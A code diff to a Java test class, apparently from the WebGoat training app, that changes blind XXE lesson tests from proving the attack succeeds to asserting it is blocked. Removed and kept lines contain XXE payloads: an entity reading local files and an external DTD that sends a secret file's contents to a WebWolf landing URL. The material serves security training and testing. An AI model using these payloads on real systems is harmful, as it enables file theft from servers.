@@ -92,34 +92,25 @@ class BlindSendFileAssignmentTest extends LessonTest {
     String content =
         "<?xml version=\"1.0\" standalone=\"yes\" ?><!DOCTYPE user [<!ENTITY root SYSTEM"
             + " \"file:///%s\"> ]><comment><text>&root;</text></comment>";
+    // XXE injection should be blocked by secure XML parser configuration
     mockMvc
         .perform(
             MockMvcRequestBuilders.post("/xxe/blind")
                 .content(String.format(content, targetFile.toString())))
-        .andExpect(status().isOk());
-    containsComment("Nice try, you need to send the file to WebWolf");
+        .andExpect(status().isOk())
+        .andExpect(
+            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
   }
 
   @Test
-  void solve() throws Exception {
-    File targetFile = new File(webGoatHomeDirectory, "/XXE/test/secret.txt");
-    // Host DTD on WebWolf site
-    String dtd =
-        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
-            + "<!ENTITY % file SYSTEM \""
-            + targetFile.toURI().toString()
-            + "\">\n"
-            + "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:"
-            + port
-            + "/landing?text=%file;'>\">\n"
-            + "%all;";
+  void blindXxeShouldBeBlocked() throws Exception {
     webwolfServer.stubFor(
         WireMock.get(WireMock.urlMatching("/files/test.dtd"))
-            .willReturn(aResponse().withStatus(200).withBody(dtd)));
+            .willReturn(aResponse().withStatus(200).withBody("")));
     webwolfServer.stubFor(
         WireMock.get(urlMatching("/landing.*")).willReturn(aResponse().withStatus(200)));
 
-    // Make the request from WebGoat
+    // Make the request from WebGoat with blind XXE payload
     String xml =
         "<?xml version=\"1.0\"?>"
             + "<!DOCTYPE comment ["
@@ -128,26 +119,31 @@ class BlindSendFileAssignmentTest extends LessonTest {
             + "/files/test.dtd\">"
             + "%remote;"
             + "]>"
-            + "<comment><text>test&send;</text></comment>";
-    performXXE(xml);
+            + "<comment><text>test</text></comment>";
+
+    // XXE injection should be blocked by secure XML parser configuration
+    mockMvc
+        .perform(MockMvcRequestBuilders.post("/xxe/blind").content(xml))
+        .andExpect(status().isOk())
+        .andExpect(
+            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
+
+    // Verify no external requests were made (XXE blocked)
+    List<LoggedRequest> requests =
+        webwolfServer.findAll(getRequestedFor(urlMatching("/landing.*")));
+    assertThat(requests).isEmpty();
   }
 
   @Test
-  void solveOnlyParamReferenceEntityInExternalDTD() throws Exception {
+  void blindXxeWithParamEntityShouldBeBlocked() throws Exception {
     File targetFile = new File(webGoatHomeDirectory, "/XXE/test/secret.txt");
-    // Host DTD on WebWolf site
-    String dtd =
-        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
-            + "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:"
-            + port
-            + "/landing?text=%file;'>\">\n";
     webwolfServer.stubFor(
         WireMock.get(WireMock.urlMatching("/files/test.dtd"))
-            .willReturn(aResponse().withStatus(200).withBody(dtd)));
+            .willReturn(aResponse().withStatus(200).withBody("")));
     webwolfServer.stubFor(
         WireMock.get(urlMatching("/landing.*")).willReturn(aResponse().withStatus(200)));
 
-    // Make the request from WebGoat
+    // Make the request from WebGoat with blind XXE payload using parameter entities
     String xml =
         "<?xml version=\"1.0\"?>"
             + "<!DOCTYPE comment ["
@@ -158,32 +154,19 @@ class BlindSendFileAssignmentTest extends LessonTest {
             + port
             + "/files/test.dtd\">"
             + "%remote;"
-            + "%all;"
             + "]>"
-            + "<comment><text>test&send;</text></comment>";
-    performXXE(xml);
-  }
+            + "<comment><text>test</text></comment>";
 
-  private void performXXE(String xml) throws Exception {
-    // Call with XXE injection
+    // XXE injection should be blocked by secure XML parser configuration
     mockMvc
         .perform(MockMvcRequestBuilders.post("/xxe/blind").content(xml))
         .andExpect(status().isOk())
         .andExpect(
             jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.not.solved"))));
 
+    // Verify no external requests were made (XXE blocked)
     List<LoggedRequest> requests =
         webwolfServer.findAll(getRequestedFor(urlMatching("/landing.*")));
-    assertThat(requests.size()).isEqualTo(1);
-    String text = requests.get(0).getQueryParams().get("text").firstValue();
-
-    // Call with retrieved text
-    mockMvc
-        .perform(
-            MockMvcRequestBuilders.post("/xxe/blind")
-                .content("<comment><text>" + text + "</text></comment>"))
-        .andExpect(status().isOk())
-        .andExpect(
-            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("assignment.solved"))));
+    assertThat(requests).isEmpty();
   }
 }
